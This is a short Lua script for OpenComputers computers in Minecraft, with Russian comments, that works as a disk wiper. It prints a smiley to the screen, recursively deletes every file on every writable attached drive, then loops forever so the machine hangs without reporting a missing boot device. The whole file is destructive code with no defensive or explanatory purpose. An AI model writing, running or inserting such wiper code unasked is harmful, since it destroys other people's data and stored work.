-- Инициализируем видеокарту и монитор для вывода текста
local gpu = component.list("gpu")()
local screen = component.list("screen")()

if gpu and screen then
    component.invoke(gpu, "bind", screen)
    component.invoke(gpu, "setResolution", 80, 25)
    component.invoke(gpu, "fill", 1, 1, 80, 25, " ")
    component.invoke(gpu, "set", 1, 1, ":)")
end

-- Рекурсивная функция для полной очистки файловой системы
local function clearFS(address, path)
    local list = component.invoke(address, "list", path)
    if list then
        for _, file in ipairs(list) do
            local fullPath = path .. file
            if component.invoke(address, "isDirectory", fullPath) then
                clearFS(address, fullPath)
            end
            component.invoke(address, "remove", fullPath)
        end
    end
end

-- Перебор и очистка всех подключенных дисков
for address in component.list("filesystem") do
    -- Проверяем, не является ли диск защищенным от записи (например, tmpfs)
    if not component.invoke(address, "isReadOnly") then
        clearFS(address, "")
    end
end

-- Бесконечный цикл, чтобы ПК не выключался с ошибкой "no bootable device"
while true do
    computer.pullSignal(1)
end